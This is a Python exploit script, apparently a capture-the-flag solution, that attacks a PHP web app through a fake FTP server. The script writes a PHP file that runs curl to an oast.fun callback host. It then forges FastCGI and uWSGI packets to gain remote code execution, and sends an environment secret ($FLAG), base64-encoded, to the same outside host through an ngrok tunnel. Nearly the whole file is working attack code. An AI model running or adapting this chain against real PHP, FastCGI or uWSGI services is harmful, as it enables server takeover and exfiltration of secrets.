import socketserver
import struct
import requests
import threading


#https://github.com/dfyz/ctf-writeups/blob/master/hxp-2020/resonator/fake_ftp.py
#https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py

class FakeFTP(socketserver.StreamRequestHandler):
    def _send(self, cmd):
        print(f'Sent "{cmd.decode()}"')
        self.wfile.write(cmd + b'\r\n')

    def handle(self):
        self.allow_reuse_address = True
        print('A new connection appears!')
        self._send(b'200 oh hai')
        while True:
            cmd = self.rfile.readline().rstrip()
            print(f'Got "{cmd.decode()}"')

            if cmd:
                cmd = cmd.split()[0]

            if cmd in (b'USER', b'TYPE'):
                self._send(b'200 ok')
            elif cmd in (b'SIZE', b'EPSV'):
                self._send(b'500 nope')
            elif cmd == b'PASV':
                self._send(f'227 go to ({TARGET_IP},{LOCAL_PORT // 256},{LOCAL_PORT % 256})'.encode())
            elif cmd == b'STOR':
                self._send(b'150 do it!')
                self._send(b'226 nice knowing you')
            elif cmd in (b'', b'QUIT'):
                print('All done!')
                self.finish()
                break
            else:
                raise Exception('Unknown command')

FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_RESPONDER = 1


def create_packet(packet_type, content):
    version, request_id, padding_length, reserved = 1, 1, 0, 0
    header = struct.pack('>BBHHBB', version, packet_type, request_id, len(content), padding_length, reserved)
    return header + content


def pack_params(params):
    result = b''
    for k, v in params.items():
        assert len(k) <= 127 and len(v) <= 127
        result += struct.pack('>BB', len(k), len(v)) + k.encode() + v.encode()
    return result


def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s)
    return s[::-1]



def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result

def run_ftp_server():
    with socketserver.TCPServer(('', 23), FakeFTP) as server:
        server.allow_reuse_address = True
        server.handle_request()

if __name__ == '__main__':
    requests.post("http://localhost/index.php", data={"action": "beta", "file_path":"/tmp/test.php", "note": "<?php system('curl kfnxtldcyggwlksvrdzk7rq9izimhh5hh.oast.fun?h=$(getent hosts backend)  --max-time 1'); ?>"})
    LOCAL_PORT = 9000
    TARGET_IP = "127,0,0,1"
    print('Running FakeFTP for FastCGI')
    ftp_thread = threading.Thread(target=run_ftp_server)
    ftp_thread.start()
    params = {
        'SCRIPT_FILENAME': f'/tmp/test.php',
        'QUERY_STRING': '',
        'SCRIPT_NAME': f'/tmp/test.php',
        'REQUEST_METHOD': 'GET',
    }
    evil_fcgi_packet = b''.join([
        create_packet(FCGI_BEGIN_REQUEST, struct.pack('>H', FCGI_RESPONDER) + b'\x00' * 6),
        create_packet(FCGI_PARAMS, pack_params(params)),
        create_packet(FCGI_PARAMS, pack_params({})),
        create_packet(FCGI_STDIN, b''),
    ])
    __import__("time").sleep(6)
    requests.post("http://localhost/index.php", data={"action": "beta", "file_path":"ftp://4.tcp.eu.ngrok.io:17798/aha", "note": evil_fcgi_packet})
    TARGET_IP = input("backend'ip address ? ").replace(".", ",")
    while True:
        try:
            print('Running FakeFTP for uwsgi')
            LOCAL_PORT = 8888
            ftp_thread = threading.Thread(target=run_ftp_server)
            ftp_thread.start()
            break
        except OSError:
            pass
    var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': "/",
        'REQUEST_URI': "/",
        'QUERY_STRING': "",
        'SERVER_NAME': "host",
        'HTTP_HOST': "host",
        'UWSGI_FILE': 'exec://curl http://kfnxtldcyggwlksvrdzk7rq9izimhh5hh.oast.fun?a="$(echo $FLAG|base64 -w 0)";echo /app/app.py',
        'SCRIPT_NAME': "/app/app.py:app"
    }
    evil_uwcgi_packet = pack_uwsgi_vars(var)
    requests.post("http://localhost/index.php", data={"action": "beta", "file_path":"ftp://4.tcp.eu.ngrok.io:17798/aha", "note": evil_uwcgi_packet})
    print("done.")
